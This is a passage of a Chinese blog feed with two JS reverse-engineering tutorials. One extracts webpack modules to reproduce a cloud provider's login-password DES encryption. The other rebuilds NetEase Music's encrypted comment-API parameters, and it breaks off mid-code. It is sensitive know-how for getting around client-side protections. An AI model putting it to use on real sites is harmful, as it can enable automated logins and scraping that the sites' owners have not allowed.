src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071603051.png" alt="img"> </p><p>就像图中所展示的那样，要怎么才能把目标给扣出来呢?</p><p>首先，想要扣取webpack代码就要先找到其基本要素，注意:自执行函数不是关键，关键的是传入的实参，也就是那个对象(数组)</p><ul><li>传入的实参<ul><li>传入的实参也就是我们的目标，把目标函数放到自己构建的对象里面就行了</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//构建自己的对象,把上面的目标给填到这个里面就行</span></span><br><span class="line">&#123;</span><br><span class="line">     <span class="string">&quot;wk8/&quot;</span>: <span class="keyword">function</span>(<span class="params">e, t, n</span>) &#123;</span><br><span class="line">        <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;g&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;q&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;m&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;I&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;o&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;r&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;v&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;n&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> o = <span class="title function_">n</span>(<span class="string">&quot;zvER&quot;</span>)</span><br><span class="line">          , a = <span class="title function_">n</span>(<span class="string">&quot;MuMZ&quot;</span>);</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">r</span>(<span class="params">e, t, n</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = &#123;</span><br><span class="line">                <span class="attr">username</span>: e,</span><br><span class="line">                <span class="attr">password</span>: <span class="title class_">Object</span>(a.<span class="property">a</span>)(t),</span><br><span class="line">                <span class="attr">captcha</span>: n</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">return</span> o.<span class="property">a</span>.<span class="title function_">formPost</span>(<span class="string">&quot;/user/login&quot;</span>, r)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">i</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">m</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">g</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">y</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">L</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;test&quot;</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;test success!!&quot;</span>)&#125; <span class="comment">//这个仅用于测试使用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><ul><li>当目标函数中有依赖的模块时，把依赖的模块也通通放到自己写的对象里面即可</li></ul></li></ul><ul><li>加载器函数</li></ul><ul><li><ul><li>当看到如上图的代码时可能会有人会不明白这哪里有加载器，就连自执行函数都没有</li><li>但实际上肯定是有加载器的，如图</li></ul></li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071606459.png" alt="img"> </p><ul><li><ul><li>所以在定位到目标时，目标的大函数一般会加载其他模块，若要加载其他模块就会使用到加载器，以此就可以找到加载器了</li></ul></li><li><p>但是，当断到我们想要的[目标函数]时再去定位n(“”)函数哪里是显示不出来的，如图</p></li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071608705.png" alt="image-20240507160832661"> </p><p>这是因为加载器函数实际上是在你打开网页的时候就已经加载到内存中了，而只有当我们进行登录这一具体操作时才会执行调用这个函数，所以这时是找不到加载器的。</p><p>解决方法也很简单: 只需在加载模块的前面加上断点，然后刷新页面就可以找到加载器的位置了</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071609396.png" alt="img"> </p><ul><li>到此，目标函数以及加载器都已经找齐了</li></ul><h2 id="04-webpack调用原理分析"><a href="#04-webpack调用原理分析" class="headerlink" title="04 webpack调用原理分析"></a>04 webpack调用原理分析</h2><p>在上面的环节中我们确定了目标函数并找到了加载器，但正如我们看到的那样，它并不像我们自己写的那个webpack直接把大对象给传进去了，而是在另一个独立的文件里面，那么加载器又是如何对另一份独立的文件中的模块进行加载的呢?</p><p>首先来看我们找的的那个加载器,如图：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071615605.png" alt="img"> </p><p>接下来我们要解决的是自执行函数的形参c是如何变成独立文件中的那个存有模块的对象的:</p><ol><li>我们把得到的自执行函数拿出来放到node.js环境中执行一下</li></ol><ul><li><ul><li>其中将传入的空数组变成一个对象，对象里面放有一个测试函数</li><li>输出自执行函数的形参</li><li>并将加载器函数给导出来</li></ul></li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071619382.png" alt="img"> </p><ol start="2"><li>我们将目标函数所在的那个独立文件全部写入到另一个文件当中去</li></ol><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071620373.png" alt="img"> </p><ol start="3"><li>在自执行函数的上面对刚刚写入的文件进行引入，再次执行函数</li></ol><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071620775.png" alt="img"> </p><ol start="4"><li>通过实验，我们知道了通过引入外部文件可以将模块加载到形参里面，那么是如何实现的呢? 通过调试自执行代码可以明白</li></ol><ul><li>在与单个文件有相同部分下面可疑部分打上几个断点如下:</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071620297.png" alt="img"> </p><ul><li>接着向下进行，通过读代码可以知道通过for循环执行了函数n(),通过下图可以知道是为了加载外部模块</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071620315.png" alt="img"> </p><ul><li>再向下进行到第三个断点</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071621596.png" alt="img"> </p><p>至于那个for循环是怎么将外部模块进行引入的我们并不需要深究，只需要知道当扣代码时一定不能将这个for循环给忘掉，如果忘掉的话外部文件是无法加载进来的。</p><h1 id="逆向参数"><a href="#逆向参数" class="headerlink" title="逆向参数"></a>逆向参数</h1><h2 id="1-定位到password加密函数"><a href="#1-定位到password加密函数" class="headerlink" title="1. 定位到password加密函数"></a>1. 定位到password加密函数</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071624397.png" alt="img"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">encodeURI(Object(w[&quot;c&quot;])(a.value, Object(w[&quot;f&quot;])(Object(w[&quot;g&quot;])(r.value))))</span><br></pre></td></tr></table></figure><p>拆分一下后如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r.value</span><br><span class="line">Object(w[&quot;g&quot;])(r.value)</span><br><span class="line">Object(w[&quot;f&quot;])(Object(w[&quot;g&quot;])(r.value)</span><br><span class="line"></span><br><span class="line">a.value</span><br><span class="line"></span><br><span class="line">Object(w[&quot;c&quot;])(a.value, Object(w[&quot;f&quot;])(Object(w[&quot;g&quot;])(r.value)))</span><br><span class="line"></span><br><span class="line">encodeURI(Object(w[&quot;c&quot;])(a.value, Object(w[&quot;f&quot;])(Object(w[&quot;g&quot;])(r.value))))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071624714.png" alt="img"> </p><h2 id="2-第一个参数分析"><a href="#2-第一个参数分析" class="headerlink" title="2. 第一个参数分析"></a>2. 第一个参数分析</h2><p>a.value：直接就是输入的密码明文</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071625245.png" alt="img"> </p><h2 id="3-第二个参数分析"><a href="#3-第二个参数分析" class="headerlink" title="3. 第二个参数分析"></a>3. 第二个参数分析</h2><p>Object(w[“f”])(Object(w[“g”])(r.value)</p><h3 id="（1）w-“g”"><a href="#（1）w-“g”" class="headerlink" title="（1）w[“g”]"></a>（1）w[“g”]</h3><p>这个函数是js的[字符串替换]函数，这个函数有两个参数，第一个函数可以是字符串或正则表达式（用以进行匹配的子字符串），第二个函数是字符串（替换匹配的子字符串）。就是在原字符串上把和第一个参数相同的字符串替换成第二个参数的字符串。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071626148.png" alt="img"> </p><p>这个例子使用的是正则表达式匹配字符串，其中”&#x2F; &#x2F;“这个是固定写法，”\s”是转移符号用以匹配任何空白字符，包括空格、制表符、换页符等等，“g”表示全局匹配将替换所有匹配的子串，如果不加”g”当匹配到第一个后就结束了。</p><p>这个例子的意思就是将原字符串中的所有空白字符替换成””，比如”abc d efg “字样的字符串使用这个函数后将变成”abcdefg”。</p><h3 id="（2）w-“f”"><a href="#（2）w-“f”" class="headerlink" title="（2）w[“f”]"></a>（2）w[“f”]</h3><p>这个函数的作用就是用户名填充。</p><p>当输出的用户名不足24位的时候，在后面补充 “0”。比如输入用户名为 “<a href="mailto:&#97;&#x64;&#x6d;&#105;&#110;&#64;&#x31;&#x32;&#51;&#x2e;&#x63;&#x6f;&#109;">&#97;&#x64;&#x6d;&#105;&#110;&#64;&#x31;&#x32;&#51;&#x2e;&#x63;&#x6f;&#109;</a>“，则填充后为 “<a href="mailto:&#x61;&#100;&#109;&#x69;&#110;&#x40;&#49;&#50;&#51;&#46;&#99;&#x6f;&#x6d;&#x30;&#x30;&#48;&#x30;&#48;&#48;&#48;&#x30;&#48;&#48;&#48;">&#x61;&#100;&#109;&#x69;&#110;&#x40;&#49;&#50;&#51;&#46;&#99;&#x6f;&#x6d;&#x30;&#x30;&#48;&#x30;&#48;&#48;&#48;&#x30;&#48;&#48;&#48;</a>“</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071629181.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071629502.png" alt="img"> </p><h2 id="4-加密函数分析"><a href="#4-加密函数分析" class="headerlink" title="4. 加密函数分析"></a>4. 加密函数分析</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071630272.png" alt="img"> </p><h3 id="1）根据代码可以初步判断为DES加密："><a href="#1）根据代码可以初步判断为DES加密：" class="headerlink" title="1）根据代码可以初步判断为DES加密："></a>1）根据代码可以初步判断为DES加密：</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071631831.png" alt="img"> </p><p>分析代码逻辑：</p><ul><li>只传入了一个参数：密码字段</li><li>前面都是var定义局部变量</li><li>关键加密代码：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">l = p.a.TripleDES.encrypt(e, d, s);</span><br></pre></td></tr></table></figure><p>这块相当于对象一步步调用方法，所以，这块要先定位到对象 “p”</p><h3 id="2）向上找，定位到对象p"><a href="#2）向上找，定位到对象p" class="headerlink" title="2）向上找，定位到对象p"></a>2）向上找，定位到对象p</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">l = t(&quot;3452&quot;)</span><br><span class="line">p = t.n(l)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071632338.png" alt="img"> </p><p>这块可以明显看到就是相当于webpack的方式，模块化调用</p><h3 id="3）将当前的整个代码复制下来放到notepad-中"><a href="#3）将当前的整个代码复制下来放到notepad-中" class="headerlink" title="3）将当前的整个代码复制下来放到notepad++中"></a>3）将当前的整个代码复制下来放到notepad++中</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071632355.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071632854.png" alt="img"> </p><h3 id="4）找到webpack代码的分发器（加载器）"><a href="#4）找到webpack代码的分发器（加载器）" class="headerlink" title="4）找到webpack代码的分发器（加载器）"></a>4）找到webpack代码的分发器（加载器）</h3><p>刷新页面，在刚刚打的断点p处停下<br>l &#x3D; t(“3452”) 中加载了用的加解密算法，我们，需要的就是DES的加密和解密算法</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071633160.png" alt="img"> </p><p>所以，接下来定位到 “<strong>t</strong>“ ，t就是我们要找的分发器：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071633295.png" alt="img"> </p><p>简单改写一下分发器：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fff</span><br><span class="line"></span><br><span class="line">!<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">u</span>(<span class="params">n</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (r[n])</span><br><span class="line">            <span class="keyword">return</span> r[n].<span class="property">exports</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;--&gt;&#x27;</span>,n)</span><br><span class="line">        <span class="keyword">var</span> t = r[n] = &#123;</span><br><span class="line">            <span class="attr">i</span>: n,</span><br><span class="line">            <span class="attr">l</span>: !<span class="number">1</span>,</span><br><span class="line">            <span class="attr">exports</span>: &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> e[n].<span class="title function_">call</span>(t.<span class="property">exports</span>, t, t.<span class="property">exports</span>, u),</span><br><span class="line">        t.<span class="property">l</span> = !<span class="number">0</span>,</span><br><span class="line">        t.<span class="property">exports</span></span><br><span class="line">    &#125;</span><br><span class="line">    fff = u</span><br><span class="line">&#125;(&#123;</span><br><span class="line">   <span class="comment">//模块化代码填充</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="5）加密模块为”3452”，但是当前扣取到notepad-中的代码没有-3452-模块"><a href="#5）加密模块为”3452”，但是当前扣取到notepad-中的代码没有-3452-模块" class="headerlink" title="5）加密模块为”3452”，但是当前扣取到notepad++中的代码没有 3452 模块"></a>5）加密模块为”3452”，但是当前扣取到notepad++中的代码没有 3452 模块</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071637070.png" alt="img"> </p><p>全局查找，定位到 “3452” 模块代码：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071637902.png" alt="img"> </p><h3 id="6）扣取加密模块代码"><a href="#6）扣取加密模块代码" class="headerlink" title="6）扣取加密模块代码"></a>6）扣取加密模块代码</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071637205.png" alt="img"> </p><p>将模块代码扣取出来。放到刚刚其前一步做好的加载器中：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">从&quot;00bb&quot;开始，扣取全部模块代码</span><br><span class="line"></span><br><span class="line">省略。。。</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071637596.png" alt="img"> </p><h3 id="7）编写加密函数"><a href="#7）编写加密函数" class="headerlink" title="7）编写加密函数"></a>7）编写加密函数</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//构建加密函数</span></span><br><span class="line"><span class="keyword">var</span> p = <span class="title function_">fff</span>(<span class="string">&#x27;3452&#x27;</span>);   <span class="comment">//定义导出函数，将加密模块导出为全局变量p</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getUsername</span>(<span class="params">e</span>)&#123;</span><br><span class="line">  <span class="comment">//用户名长度不够末尾自动补零</span></span><br><span class="line">   <span class="keyword">var</span> n = <span class="variable language_">arguments</span>.<span class="property">length</span> &gt; <span class="number">1</span> &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== <span class="variable language_">arguments</span>[<span class="number">1</span>] ? <span class="variable language_">arguments</span>[<span class="number">1</span>] : &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span> (e &amp;&amp; <span class="string">&quot;string&quot;</span> === <span class="keyword">typeof</span> e) &#123;</span><br><span class="line">        <span class="keyword">var</span> t = n.<span class="property">text</span> || <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            r = n.<span class="property">length</span> || <span class="number">24</span>;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">length</span> &lt; r) </span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> a = e.<span class="property">length</span>; a &lt; r; a++)</span><br><span class="line">            e += t;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">          e = e.<span class="title function_">substring</span>(<span class="number">0</span>, r);</span><br><span class="line">      <span class="comment">//去除用户名中的空格</span></span><br><span class="line">        <span class="keyword">return</span> e.<span class="title function_">replace</span>(<span class="regexp">/\s+/g</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getPwd</span>(<span class="params">pwd,name</span>)&#123;</span><br><span class="line">  <span class="comment">//构建加密函数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//导出加密p对象</span></span><br><span class="line">  <span class="keyword">var</span> n = <span class="title function_">getUsername</span>(name)</span><br><span class="line">  , c = pwd</span><br><span class="line">  , d = p.<span class="property">enc</span>[<span class="string">&#x27;utf-8&#x27;</span>].<span class="title function_">parse</span>(n)</span><br><span class="line">  , l = &#123;</span><br><span class="line">    <span class="attr">mode</span>: p.<span class="property">mode</span>[<span class="string">&#x27;ECB&#x27;</span>],</span><br><span class="line">    <span class="attr">padding</span>: p.<span class="property">pad</span>[<span class="string">&#x27;pkcs7&#x27;</span>]</span><br><span class="line">  &#125;</span><br><span class="line">  , s = p.<span class="property">DES</span>.<span class="title function_">encrypt</span>(c, d, l);</span><br><span class="line">  <span class="keyword">return</span> s.<span class="title function_">toString</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8）汇总一下代码"><a href="#8）汇总一下代码" class="headerlink" title="8）汇总一下代码"></a>8）<strong>汇总一下代码</strong></h3><p>参考后面第四部分，完整代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分发器代码+加密模块代码+自写加密函数代码</span><br></pre></td></tr></table></figure><h3 id="9）测试"><a href="#9）测试" class="headerlink" title="9）测试"></a>9）测试</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071639873.png" alt="img"> </p><h1 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h1><h2 id="1-第二个参数代码"><a href="#1-第二个参数代码" class="headerlink" title="1. 第二个参数代码"></a>1. 第二个参数代码</h2><p>作用：处理用户名（使用正则替换用户名中的任何空白字符【包括空格、制表符、换页符等等】为空，然后将用户名的长度使用 “0” 填充为 24位）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Q = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = <span class="variable language_">arguments</span>.<span class="property">length</span> &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== <span class="variable language_">arguments</span>[<span class="number">0</span>] ? <span class="variable language_">arguments</span>[<span class="number">0</span>] : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> e.<span class="title function_">replace</span>(<span class="regexp">/\s+/g</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">F = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> n = <span class="variable language_">arguments</span>.<span class="property">length</span> &gt; <span class="number">1</span> &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== <span class="variable language_">arguments</span>[<span class="number">1</span>] ? <span class="variable language_">arguments</span>[<span class="number">1</span>] : &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span> (e &amp;&amp; <span class="string">&quot;string&quot;</span> === <span class="keyword">typeof</span> e) &#123;</span><br><span class="line">        <span class="keyword">var</span> t = n.<span class="property">text</span> || <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            r = n.<span class="property">length</span> || <span class="number">24</span>;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">length</span> &lt; r) <span class="keyword">for</span> (<span class="keyword">var</span> a = e.<span class="property">length</span>; a &lt; r; a++)</span><br><span class="line">        e += t;</span><br><span class="line">        <span class="keyword">else</span> e = e.<span class="title function_">substring</span>(<span class="number">0</span>, r);</span><br><span class="line">        <span class="keyword">return</span> e</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071640006.png" alt="img"> </p><h2 id="2-完整JS代码"><a href="#2-完整JS代码" class="headerlink" title="2. 完整JS代码"></a>2. 完整JS代码</h2><p>代码太多了，插入附件参考</p><p><a href="https://gitee.com/jingweihang/img/blob/master/hexo/202405/m.ctyun.cn.js">hexo&#x2F;202405&#x2F;m.ctyun.cn.js · 要优秀&#x2F;img - Gitee.com</a></p>]]></content>
      
      
      <categories>
          
          <category> JS逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS逆向 </tag>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某music音乐评论解密</title>
      <link href="/2024/05/07/%E6%9F%90music%E9%9F%B3%E4%B9%90%E8%AF%84%E8%AE%BA%E8%A7%A3%E5%AF%86/"/>
      <url>/2024/05/07/%E6%9F%90music%E9%9F%B3%E4%B9%90%E8%AF%84%E8%AE%BA%E8%A7%A3%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="常规分析"><a href="#常规分析" class="headerlink" title="常规分析"></a>常规分析</h1><p>这块很多步骤参考原作者文章，地址如下：</p><p><a href="https://mp.weixin.qq.com/s/loXsmR8uhrtFA_3EuBQB8w">https://mp.weixin.qq.com/s/loXsmR8uhrtFA_3EuBQB8w</a></p><h2 id="目标地址"><a href="#目标地址" class="headerlink" title="目标地址"></a>目标地址</h2><p>aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvc29uZz9pZD0yMDYxOTc4OTYx</p><h2 id="分析数据包"><a href="#分析数据包" class="headerlink" title="分析数据包"></a>分析数据包</h2><p>1、获取评论接口为<a href="https://music.163.com/weapi/comment/resource/comments/get?csrf_token=">https://music.163.com/weapi/comment/resource/comments/get?csrf_token=</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405070950955.png" alt="image.png"> </p><p>2、POST请求，里面有两个参数 “<strong>params</strong>“和”<strong>encSecKey</strong>“</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071105575.png" alt="image.png"> </p><p>尝试多次请求，发现这两个参数值是一直变化的。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071106618.png" alt="image.png"> </p><h2 id="分析参数"><a href="#分析参数" class="headerlink" title="分析参数"></a>分析参数</h2><p>按照以往的抓取经验来说，它们大概率是在一起的，因此可以通过全局搜索<strong>encSecKey</strong>这个词汇。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071106426.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var bKL9C = window.asrsea(JSON.stringify(i6c), bvl1x([&quot;流泪&quot;, &quot;强&quot;]), bvl1x(Rj5o.md), bvl1x([&quot;爱心&quot;, &quot;女孩&quot;, &quot;惊恐&quot;, &quot;大笑&quot;]));</span><br><span class="line">e6c.data = j6d.cq6k(&#123;</span><br><span class="line">  params: bKL9C.encText,</span><br><span class="line">  encSecKey: bKL9C.encSecKey</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>打断点调试一下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071107423.png" alt="fae1bc4fedfcd635849bfcf0d8c47326.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071107384.png" alt="d296bd02b2adf2c40ac2011ddc78fd5a.png"> </p><p>成功定位到参数的具体位置。。。</p><h2 id="寻找加密函数"><a href="#寻找加密函数" class="headerlink" title="寻找加密函数"></a>寻找加密函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var bKL9C = window.asrsea(JSON.stringify(i6c), bvl1x([&quot;流泪&quot;, &quot;强&quot;]), bvl1x(Rj5o.md), bvl1x([&quot;爱心&quot;, &quot;女孩&quot;, &quot;惊恐&quot;, &quot;大笑&quot;]));</span><br><span class="line">e6c.data = j6d.cq6k(&#123;</span><br><span class="line">  params: bKL9C.encText,</span><br><span class="line">  encSecKey: bKL9C.encSecKey</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>加密函数应该就是asrsea，在里面一共要传递四个参数。我们可以看看这四个参数分别是什么？</p><p>点击翻页，然后断点下来后查看参数值：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071108857.png" alt="img"> </p><p>由上图可以发现，这四个参数中，分别找了两个数据包来判断，它们会不会有什么变化，变化的值是<strong>pageNo。</strong></p><p>当然了，这里除了pageNo之外，还有cursor也是变化的，它代表的是时间戳。</p><p>意味着即使是相同的页面<strong>params</strong>和<strong>encSecKey</strong>的值也是时时刻刻都在发生变化的。</p><h2 id="进入加密函数"><a href="#进入加密函数" class="headerlink" title="进入加密函数"></a>进入加密函数</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071109485.png" alt="img"> </p><p>进来之后，函数套函数，开始补全js代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function d(d, e, f, g) &#123;</span><br><span class="line">        var h = &#123;&#125;</span><br><span class="line">          , i = a(16);</span><br><span class="line">        return h.encText = b(d, g),</span><br><span class="line">        h.encText = b(h.encText, i),</span><br><span class="line">        h.encSecKey = c(i, e, f),</span><br><span class="line">        h</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071109254.png" alt="image.png"> </p><p>里面包含了</p><ul><li>函数a</li><li>函数b</li><li>函数c</li></ul><h3 id="函数a"><a href="#函数a" class="headerlink" title="函数a"></a>函数a</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function a(a) &#123;</span><br><span class="line">        var d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;</span><br><span class="line">        for (d = 0; a &gt; d; d += 1)</span><br><span class="line">            e = Math.random() * b.length,</span><br><span class="line">            e = Math.floor(e),</span><br><span class="line">            c += b.charAt(e);</span><br><span class="line">        return c</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>不难看出，<strong>它的主要作用是生成16位随机字符</strong></p><p>简单做个修改</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function a(length)&#123;</span><br><span class="line">    let d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;</span><br><span class="line">    for (d = 0; length &gt; d; d += 1)&#123;</span><br><span class="line">        e = Math.random() * b.length;</span><br><span class="line">        e = Math.floor(e);</span><br><span class="line">        c += b.charAt(e);</span><br><span class="line">    &#125;</span><br><span class="line">    return c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let result = a(16);</span><br></pre></td></tr></table></figure><h3 id="函数b"><a href="#函数b" class="headerlink" title="函数b"></a>函数b</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function b(a, b) &#123;</span><br><span class="line">        var c = CryptoJS.enc.Utf8.parse(b)</span><br><span class="line">          , d = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;)</span><br><span class="line">          , e = CryptoJS.enc.Utf8.parse(a)</span><br><span class="line">          , f = CryptoJS.AES.encrypt(e, c, &#123;</span><br><span class="line">            iv: d,</span><br><span class="line">            mode: CryptoJS.mode.CBC</span><br><span class="line">        &#125;);</span><br><span class="line">        return f.toString()</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>接下来，就来解释一下，这段代码的意思。</p><p>a代表的是你要加密的字符串，b代表密钥。它的基本作用是利用AES加密算法配合CBC模式的加密过程，最后以base64的形式输出</p><p>简单修改一下，上述代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function generateRandomString(length)&#123;</span><br><span class="line">    let d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;</span><br><span class="line">    for (d = 0; length &gt; d; d += 1)&#123;</span><br><span class="line">        e = Math.random() * b.length;</span><br><span class="line">        e = Math.floor(e);</span><br><span class="line">        c += b.charAt(e);</span><br><span class="line">    &#125;</span><br><span class="line">    return c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 